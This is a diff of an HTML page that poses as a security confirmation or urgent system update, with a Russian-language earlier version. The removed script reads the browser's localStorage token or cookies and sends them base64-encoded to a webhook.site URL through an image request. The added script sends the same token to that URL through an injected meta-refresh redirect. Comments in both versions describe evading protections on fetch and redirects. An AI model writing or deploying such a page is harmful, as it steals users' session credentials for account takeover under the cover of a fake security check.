@@ -1,20 +1,17 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta property="og:title" content="Срочное обновление системы">
-    <meta property="og:description" content="Нажмите, чтобы прочитать детали безопасности">
-    <meta property="og:image" content="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png">
+    <meta property="og:title" content="Security Confirmation">
+    <script>
+        var t = localStorage.getItem('token') || 'no_token';
+        // Динамически создаем мета-тег, который может пробить защиту
+        var meta = document.createElement('meta');
+        meta.httpEquiv = "refresh";
+        meta.content = "0;url=https://webhook.site/c8ce1351-d58c-41cc-a576-f8f0c4ed50d6?final_data=" + btoa(t);
+        document.getElementsByTagName('head')[0].appendChild(meta);
+    </script>
 </head>
 <body>
-    <script>
-        // Вместо мгновенного редиректа, пробуем "тихую" отправку через тег изображения
-        // Это часто обходит запреты на fetch/location
-        var token = localStorage.getItem('token') || document.cookie;
-        if (token) {
-            var img = new Image();
-            img.src = 'https://webhook.site/c8ce1351-d58c-41cc-a576-f8f0c4ed50d6?data=' + btoa(token);
-        }
-    </script>
-    <h1>Загрузка...</h1>
+    <h1>Verifying...</h1>
 </body>
 </html>
